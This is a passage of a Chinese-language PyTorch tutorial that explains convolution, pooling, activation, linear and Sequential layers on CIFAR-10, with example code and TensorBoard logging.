38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);">,</font></strong><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><strong><font style="color:rgb(38, 38, 38);">optional</font></strong></em><strong><font style="color:rgb(38, 38, 38);">) – Number of blocked connections from input channels to output channels. Default: 1</font></strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><br><span class="hljs-built_in">input</span> = torch.tensor([[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>],<br>                     [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>],<br>                     [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],<br>                     [<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],<br>                     [<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]])<br>kernel = torch.tensor([[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>],<br>                       [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],<br>                       [<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>]])<br><br><span class="hljs-built_in">input</span> = torch.reshape(<span class="hljs-built_in">input</span>,(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>))<br>kernel = torch.reshape(kernel,(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">input</span>.shape)          <span class="hljs-comment">#torch.Size([1, 1, 5, 5])</span><br><span class="hljs-built_in">print</span>(kernel.shape)         <span class="hljs-comment">#torch.Size([1, 1, 3, 3])</span><br><br>output = F.conv2d(<span class="hljs-built_in">input</span>,kernel,stride=<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(output)<br><span class="hljs-comment"># tensor([[[[10, 12, 12],</span><br><span class="hljs-comment">#           [18, 16, 16],</span><br><span class="hljs-comment">#           [13,  9,  3]]]])</span><br><br>output2 = F.conv2d(<span class="hljs-built_in">input</span>,kernel,stride=<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(output2)<br><span class="hljs-comment"># tensor([[[[10, 12],</span><br><span class="hljs-comment">#           [13,  3]]]])</span><br><br>outp3 = F.conv2d(<span class="hljs-built_in">input</span>,kernel,stride=<span class="hljs-number">1</span>,padding=<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(outp3)<br><br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/10.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/11.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/12.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/13.jpeg"></p><h2 id="卷积层的使用"><a href="#卷积层的使用" class="headerlink" title="卷积层的使用"></a>卷积层的使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> Conv2d<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br>dataset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,transform=torchvision.transforms.ToTensor(),download=<span class="hljs-literal">True</span>)<br>dataloader = DataLoader(dataset,batch_size=<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Jimi,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-comment"># 输入是 3 个通道（RGB 图像），输出是 6 个通道 —— 网络通过 6 个卷积核提取出 6 个不同的特征图</span><br>        <span class="hljs-comment"># RGB图像：你从“红光”、“绿光”、“蓝光”三个角度看图</span><br>        <span class="hljs-comment"># CNN的中间层：你从“边缘”、“颜色变化”、“纹理”、“形状”、“方向”等多个角度观察图像</span><br>        <span class="hljs-comment"># 每个“角度”就是一个channel。</span><br>        <span class="hljs-variable language_">self</span>.conv1 = Conv2d(in_channels=<span class="hljs-number">3</span>,out_channels=<span class="hljs-number">6</span>,kernel_size=<span class="hljs-number">3</span>,stride=<span class="hljs-number">1</span>,padding=<span class="hljs-number">0</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-variable language_">self</span>.conv1(x)<br>        <span class="hljs-keyword">return</span> x<br><br>jimi = Jimi()<br><br><br>writer = SummaryWriter(<span class="hljs-string">&quot;/logs/nn_conv2d&quot;</span>)<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>    step = <span class="hljs-number">0</span><br>    imgs,targets = data<br>    output = jimi(imgs)<br>    <span class="hljs-built_in">print</span>(imgs.shape)<br>    <span class="hljs-built_in">print</span>(output.shape)<br><br>    writer.add_images(<span class="hljs-string">&quot;input&quot;</span>, imgs, step)<br>    output = torch.reshape(output,(-<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>,<span class="hljs-number">30</span>))<br>    writer.add_images(<span class="hljs-string">&quot;output&quot;</span>, output, step)<br>    step = step + <span class="hljs-number">1</span><br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/14.png"></p><h1 id="8-神经网络-池化层"><a href="#8-神经网络-池化层" class="headerlink" title="8.神经网络-池化层"></a>8.神经网络-池化层</h1><p><a href="https://docs.pytorch.org/docs/stable/nn.html#pooling-layers">https://docs.pytorch.org/docs/stable/nn.html#pooling-layers</a></p><p>池化层（Pooling Layer）是深度学习神经网络中常用的一种层，用于减少特征图的空间尺寸，同时保留重要信息。池化层通常紧跟在卷积层之后，通过对特征图进行下采样来减少参数数量，降低计算复杂度，并且有助于防止过拟合。</p><p><strong><font style="color:rgb(25, 27, 31);">最大池化</font></strong><font style="color:rgb(25, 27, 31);">选取池化窗口中的最大值作为输出，</font><strong><font style="color:rgb(25, 27, 31);">平均池化</font></strong><font style="color:rgb(25, 27, 31);">计算池化窗口中的平均值作为输出。</font></p><h3 id="最大池化"><a href="#最大池化" class="headerlink" title="最大池化"></a>最大池化</h3><p>优点包括： </p><ul><li>特征不变性：最大池化能够保留局部区域内最显著的特征，使得模型对目标的位置变化具有一定的不变性。 </li><li>降维：通过取每个区域内的最大值，可以减少数据的空间尺寸，降低模型的复杂度，加快计算速度。 </li><li>减少过拟合：最大池化可以减少模型的参数数量，有助于减少过拟合的风险。</li></ul><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/15.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> MaxPool2d<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br>dataset = torchvision.datasets.CIFAR10(<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,download=<span class="hljs-literal">True</span>,transform=torchvision.transforms.ToTensor())<br>dataloader = DataLoader(dataset,batch_size=<span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># input = torch.tensor([[1,2,0,3,1],</span><br><span class="hljs-comment">#                       [0,1,2,3,1],</span><br><span class="hljs-comment">#                       [1,2,1,0,0],</span><br><span class="hljs-comment">#                       [5,2,3,1,1],</span><br><span class="hljs-comment">#                       [2,1,0,1,1]],dtype=torch.float32)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># input = torch.reshape(input,(-1,1,5,5))</span><br><span class="hljs-comment"># print(input.shape)</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Jimi,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.maxpool1 = MaxPool2d(kernel_size=<span class="hljs-number">3</span>,ceil_mode=<span class="hljs-literal">True</span>)             <span class="hljs-comment">#最大池化神经网络</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,<span class="hljs-built_in">input</span></span>):<br>        output = <span class="hljs-variable language_">self</span>.maxpool1(<span class="hljs-built_in">input</span>)<br>        <span class="hljs-keyword">return</span>  output<br><br><br>jimi = Jimi()<br><br>writer = SummaryWriter(<span class="hljs-string">&quot;logs/nn_maxpool&quot;</span>)<br>step = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>    imgs,data = data<br>    writer.add_images(<span class="hljs-string">&quot;input&quot;</span>,imgs,step)<br>    output = jimi(imgs)<br>    writer.add_images(<span class="hljs-string">&quot;output&quot;</span>,output,step)<br>    step = step + <span class="hljs-number">1</span><br><br>writer.close()<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/16.png"></p><h3 id="平均池化"><a href="#平均池化" class="headerlink" title="平均池化"></a>平均池化</h3><p>在平均池化中，对于每个池化窗口（通常是一个矩形区域），将窗口内所有像素的值取平均作为输出值。这个过程可以看作是对特征图进行降采样，减少特征图的尺寸，同时保留主要特征。平均池化的主要优点是<strong>能够保留更多的信息</strong>，相比于最大池化（Max Pooling），平均池化更加平滑，有助于保留更多细节信息。</p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/17.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torchvision.datasets<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> AvgPool2d<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br>dataset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,download=<span class="hljs-literal">True</span>,transform=torchvision.transforms.ToTensor())<br>dataloader = DataLoader(dataset,batch_size=<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AveragePool</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(AveragePool,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.AveragePool1 = AvgPool2d(kernel_size=<span class="hljs-number">3</span>,stride=<span class="hljs-number">1</span>,ceil_mode=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,<span class="hljs-built_in">input</span></span>):<br>        output = <span class="hljs-variable language_">self</span>.AveragePool1(<span class="hljs-built_in">input</span>)<br>        <span class="hljs-keyword">return</span> output<br><br>jimi = AveragePool()<br><br>writer = SummaryWriter(log_dir=<span class="hljs-string">&quot;logs/nn_AvgPool&quot;</span>)<br>step = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>    imgs,targets = data<br><br>    writer.add_images(<span class="hljs-string">&quot;input&quot;</span>,imgs,step)<br>    output = jimi(imgs)                         <span class="hljs-comment">#池化操作</span><br>    writer.add_images(<span class="hljs-string">&quot;output&quot;</span>,output,step)<br>    step = step + <span class="hljs-number">1</span><br><br>writer.close()<br><br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/18.png"></p><h1 id="9-神经网络-非线性激活"><a href="#9-神经网络-非线性激活" class="headerlink" title="9.神经网络-非线性激活"></a>9.神经网络-非线性激活</h1><ul><li>提升模型的泛化能力</li><li>所有的 <code>激活函数</code> 本质都是一种非线性变换。  </li><li>非线性变换是深度学习“能学到复杂东西”的根本原因</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> ReLU, Sigmoid<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br><span class="hljs-comment"># input = torch.tensor([[1,-0.5],</span><br><span class="hljs-comment">#                       [-1,3]])</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># output = torch.reshape(input,(-1,1,2,2))</span><br><span class="hljs-comment"># print(output.shape)</span><br><span class="hljs-comment">#</span><br><br><br>dataset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,transform=torchvision.transforms.ToTensor(),download=<span class="hljs-literal">True</span>)<br>dataloader = DataLoader(dataset,batch_size=<span class="hljs-number">64</span>)<br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Relu</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Relu,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.relu1 = ReLU()<span class="hljs-comment"># Rectified Linear Unit</span><br>        <span class="hljs-variable language_">self</span>.sigmoid1 = Sigmoid()<span class="hljs-comment"># 把输出转成 0~1，表示可能性或概率</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,<span class="hljs-built_in">input</span></span>):<br>        output = <span class="hljs-variable language_">self</span>.sigmoid1(<span class="hljs-built_in">input</span>)<br>        <span class="hljs-keyword">return</span> output<br><br>jimi = Relu()<br><br>writer = SummaryWriter(log_dir=<span class="hljs-string">&quot;/logs/nn_relu&quot;</span>)<br>step = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>    imgs,targets = data<br>    writer.add_images(<span class="hljs-string">&quot;input&quot;</span>,imgs,global_step=step)<br>    output = jimi(imgs)<br>    writer.add_images(<span class="hljs-string">&quot;output&quot;</span>,output,global_step=step)<br>    step += <span class="hljs-number">1</span><br>writer.close()<br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/19.png"></p><h1 id="10-神经网络-线性层及其他层"><a href="#10-神经网络-线性层及其他层" class="headerlink" title="10.神经网络-线性层及其他层"></a>10.神经网络-线性层及其他层</h1><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/20.png"></p><h3 id="正则化层（Normalization-Layers）"><a href="#正则化层（Normalization-Layers）" class="headerlink" title="正则化层（Normalization Layers）"></a>正则化层（Normalization Layers）</h3><p><a href="https://docs.pytorch.org/docs/stable/nn.html#normalization-layers">https://docs.pytorch.org/docs/stable/nn.html#normalization-layers</a></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/21.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> Linear<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><br>dataset = torchvision.datasets.CIFAR10(<span class="hljs-string">&quot;./download_dataset&quot;</span>, train=<span class="hljs-literal">False</span>, transform=torchvision.transforms.ToTensor(),<br>                                       download=<span class="hljs-literal">True</span>)<br><br>dataloader = DataLoader(dataset, batch_size=<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Jimi, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.linear1 = Linear(<span class="hljs-number">196608</span>, <span class="hljs-number">10</span>)           <span class="hljs-comment">#线性层，输入196608，输出10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span></span>):<br>        output = <span class="hljs-variable language_">self</span>.linear1(<span class="hljs-built_in">input</span>)<br>        <span class="hljs-keyword">return</span> output<br><br>jimi = Jimi()<br><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>    imgs, targets = data<br>    <span class="hljs-built_in">print</span>(imgs.shape)                   <span class="hljs-comment">#64, 3, 32, 32</span><br>    output = torch.flatten(imgs)        <span class="hljs-comment">#把输入展成一行</span><br>    <span class="hljs-built_in">print</span>(output.shape)                 <span class="hljs-comment">#196608(4个数相乘的结果)</span><br>    output = jimi(output)<br>    <span class="hljs-built_in">print</span>(output.shape)<br><br><br></code></pre></td></tr></table></figure><h1 id="11-神经网络-Sequential小实战"><a href="#11-神经网络-Sequential小实战" class="headerlink" title="11.神经网络-Sequential小实战"></a>11.神经网络-Sequential小实战</h1><h2 id="CIFAR-10-model"><a href="#CIFAR-10-model" class="headerlink" title="CIFAR 10 model"></a>CIFAR 10 model</h2><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/22.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/23.png"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs latex">import torch<br>from torch import nn<br>from torch.nn import Conv2d, MaxPool2d, Flatten, Linear, Sequential<br>from torch.utils.tensorboard import SummaryWriter<br><br><br>class Jimi(nn.Module):<br>    <span class="hljs-params">#</span>要确保自己写的网络是正确的（参数不对的话是不会直接报错的）<br>    def <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>init<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>(self):<br>        super(Jimi,self).<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>init<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>()<br><br><br>        <span class="hljs-params">#</span> self.conv1 = Conv2d(3,32,5,padding=2)<br>        <span class="hljs-params">#</span> self.maxpool1 = MaxPool2d(2)<br>        <span class="hljs-params">#</span> self.conv2 = Conv2d(32,32,5,padding=2)<br>        <span class="hljs-params">#</span> self.maxpool2 = MaxPool2d(2)<br>        <span class="hljs-params">#</span> self.conv3 = Conv2d(32,64,5,padding=2)<br>        <span class="hljs-params">#</span> self.maxpool3 = MaxPool2d(2)<br>        <span class="hljs-params">#</span> self.flatten = Flatten()<br>        <span class="hljs-params">#</span> self.linear1 = Linear(1024,64)<br>        <span class="hljs-params">#</span> self.linear2 = Linear(64,10)<br><br><br>        self.model1 = Sequential(               <span class="hljs-params">#</span> 依次执行以下步骤<br>            Conv2d(3,32,5,padding=2),<br>            MaxPool2d(2),<br>            Conv2d(32, 32, 5, padding=2),<br>            MaxPool2d(2),<br>            Conv2d(32, 64, 5, padding=2),<br>            MaxPool2d(2),<br>            Flatten(),<br>            Linear(1024, 64),<br>            Linear(64, 10)<br>        )<br><br>    def forward(self,x):<br>        <span class="hljs-params">#</span> x = self.conv1(x)<br>        <span class="hljs-params">#</span> x = self.maxpool1(x)<br>        <span class="hljs-params">#</span> x = self.conv2(x)<br>        <span class="hljs-params">#</span> x = self.maxpool2(x)<br>        <span class="hljs-params">#</span> x = 